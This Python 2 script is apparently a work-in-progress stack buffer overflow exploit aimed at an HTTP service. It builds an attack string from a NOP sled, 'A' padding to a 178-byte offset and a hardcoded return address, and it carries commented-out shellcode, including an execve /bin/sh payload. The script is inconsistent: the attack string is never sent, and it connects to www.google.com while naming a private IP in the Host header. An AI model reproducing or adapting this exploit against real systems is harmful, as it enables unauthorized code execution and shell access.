import socket
import time

s = socket.socket()
s.connect(('www.google.com', 80))
#s.settimeout(10)
n = 178
nops = "\x90" * 40
#shellcode = "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
shellcode =  ""
#shellcode += "\xba\x81\x3c\x36\x24\xd9\xeb\xd9\x74\x24\xf4\x5b\x33"
#shellcode += "\xc9\xb1\x14\x31\x53\x14\x83\xeb\xfc\x03\x53\x10\x63"
#shellcode += "\xc9\x07\xff\x94\xd1\x3b\xbc\x09\x7c\xbe\xcb\x4c\x30"
#shellcode += "\xd8\x06\x0e\x6a\x7b\xcb\x66\x8f\x83\xfa\x2a\xe5\x93"
#shellcode += "\xad\x82\x70\x72\x27\x44\xdb\xb8\x38\x01\x9a\x46\x8a"
#shellcode += "\x15\xad\x21\x21\x95\x8e\x1d\xdf\x58\x90\xcd\x79\x08"
#shellcode += "\xae\xa9\xb4\x4c\x99\x30\xbf\x24\x35\xec\x4c\xdc\x21"
#shellcode += "\xdd\xd0\x75\xdc\xa8\xf6\xd5\x73\x22\x19\x65\x78\xf9"
#shellcode += "\x5a"
attack = nops + shellcode + 'A'* (n-len(nops)-len(shellcode)) + '\x02\x91\x04\x08'
#print "length of attack:", len(attack)
req = 'GET ' + "HEADER"
req += " HTTP/1.1/\r\n"
req += "HOST:192.168.0.109\r\n\r\n"

s.send(req)
print s.recv(1024)
